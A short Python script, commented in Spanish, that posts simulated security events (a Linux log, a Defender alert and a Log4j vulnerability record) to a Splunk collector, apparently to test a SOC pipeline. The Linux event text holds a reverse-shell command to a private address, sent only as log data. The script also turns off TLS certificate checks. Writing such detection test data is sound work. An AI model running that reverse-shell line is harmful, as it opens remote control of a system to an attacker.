import requests
import urllib3
import json
import os
from dotenv import load_dotenv

load_dotenv()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HOST = os.getenv("SPLUNK_HOST")
TOKEN = os.getenv("HEC_TOKEN")
url = f"https://{HOST}:8088/services/collector/event"

headers = {
    "Authorization": f"Splunk {TOKEN}",
    "Content-Type": "application/json"
}

# 1. Simular Log de Linux (Texto plano)
log_event = {
    "event": "PRUEBA MULTI-FUENTE: bash -i >& /dev/tcp/10.0.0.1/4444",
    "sourcetype": "soc_test"
}

# 2. Simular Alerta de Defender (Convertido a JSON String)
edr_data = {
    "AlertTitle": "Suspicious PowerShell Execution",
    "Description": "PowerShell launched with hidden window and encoded command.",
    "Severity": "High"
}
edr_event = {
    "event": json.dumps(edr_data), # Lo enviamos como un string JSON
    "sourcetype": "ms-defender"
}

# 3. Simular Vulnerabilidad de Trivy (Convertido a JSON String)
vuln_data = {
    "VulnerabilityID": "CVE-2021-44228",
    "PkgName": "log4j-core",
    "Severity": "CRITICAL",
    "Title": "Remote Code Execution in Log4j"
}
vuln_event = {
    "event": json.dumps(vuln_data), # Lo enviamos como un string JSON
    "sourcetype": "trivy"
}

print("[*] Inyectando eventos en Splunk...")
for name, payload in [("Log Linux", log_event), ("Defender", edr_event), ("Trivy", vuln_event)]:
    r = requests.post(url, json=payload, headers=headers, verify=False)
    if r.status_code == 200:
        print(f"✅ Evento inyectado: {name}")
    else:
        print(f"❌ Error inyectando {name}: {r.text}")